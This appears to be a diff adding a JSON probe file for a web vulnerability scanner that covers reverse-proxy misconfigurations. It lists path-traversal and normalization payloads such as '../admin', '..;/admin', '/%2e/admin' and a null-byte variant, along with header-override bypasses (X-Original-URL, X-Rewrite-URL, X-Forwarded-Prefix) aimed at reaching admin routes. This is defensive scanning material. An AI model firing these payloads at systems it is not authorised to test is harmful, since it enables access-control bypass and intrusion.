@@ -1,0 +1,99 @@
+{
+  "category": "reverse_proxy_misconfig",
+  "contexts": {
+    "nginx_off_by_slash": {
+      "description": "Nginx proxy_pass off-by-slash — a missing trailing slash in proxy_pass lets the client traverse to other backend routes. location /api { proxy_pass http://backend; } means /api../admin reaches /admin on the backend.",
+      "tech_match": ["nginx"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "../admin",
+          "description": "Path traversal via missing trailing slash — /api../admin resolves to /admin on backend",
+          "matchers": [{"type": "status_diff"}, {"type": "not_word", "words": ["404", "Not Found"]}],
+          "severity": "high",
+          "confidence_boost": 40
+        },
+        {
+          "payload": "..%2fadmin",
+          "description": "URL-encoded traversal — proxy may not decode before matching location",
+          "matchers": [{"type": "status_diff"}, {"type": "not_word", "words": ["404", "Not Found"]}],
+          "severity": "high",
+          "confidence_boost": 40
+        },
+        {
+          "payload": "..;/admin",
+          "description": "Semicolon path parameter traversal — Tomcat/Jetty treat ;x=y as a path param",
+          "matchers": [{"type": "status_diff"}, {"type": "not_word", "words": ["404"]}],
+          "severity": "high",
+          "confidence_boost": 40
+        }
+      ]
+    },
+    "x_rewrite_headers": {
+      "description": "Reverse proxy header override — X-Original-URL, X-Rewrite-URL, X-Forwarded-Prefix to bypass path-based authentication. IIS/Nginx/Spring Cloud Gateway may route based on these headers instead of the real path.",
+      "tech_match": ["iis", "nginx", "spring", "asp.net", ".net"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "X-Original-URL bypass — IIS/ASP.NET routes on this header, ignoring the real request path",
+          "matchers": [{"type": "status_diff"}, {"type": "word", "words": ["admin", "dashboard", "settings", "manage"]}],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {"header": "X-Original-URL: /admin"}
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "X-Rewrite-URL bypass — similar to X-Original-URL on some reverse proxies",
+          "matchers": [{"type": "status_diff"}, {"type": "word", "words": ["admin", "dashboard", "settings"]}],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {"header": "X-Rewrite-URL: /admin"}
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "X-Forwarded-Prefix bypass — Spring Cloud Gateway prepends this to the path before routing",
+          "matchers": [{"type": "status_diff"}],
+          "severity": "medium",
+          "confidence_boost": 30,
+          "variables": {"header": "X-Forwarded-Prefix: /admin"}
+        }
+      ]
+    },
+    "path_normalization": {
+      "description": "Path normalization differences between proxy and backend — the proxy enforces /admin is 403, but the backend normalizes /./admin or /%2e/admin to /admin and serves 200.",
+      "tech_match": ["nginx", "apache", "haproxy", "tomcat", "spring", "node", "express"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "/./admin",
+          "description": "Dot-segment normalization — proxy sees /./admin (no match), backend normalizes to /admin",
+          "matchers": [{"type": "status_diff"}],
+          "severity": "high",
+          "confidence_boost": 40
+        },
+        {
+          "payload": "/%2e/admin",
+          "description": "URL-encoded dot segment — proxy does not decode before matching",
+          "matchers": [{"type": "status_diff"}],
+          "severity": "high",
+          "confidence_boost": 40
+        },
+        {
+          "payload": "/admin%00.html",
+          "description": "Null byte injection — some backends truncate at %00, serving /admin",
+          "matchers": [{"type": "status_diff"}],
+          "severity": "high",
+          "confidence_boost": 40
+        },
+        {
+          "payload": "/ADMIN",
+          "description": "Case sensitivity mismatch — proxy matches /admin (case-sensitive), backend serves /ADMIN (case-insensitive)",
+          "matchers": [{"type": "status_diff"}],
+          "severity": "medium",
+          "confidence_boost": 30
+        }
+      ]
+    }
+  }
+}
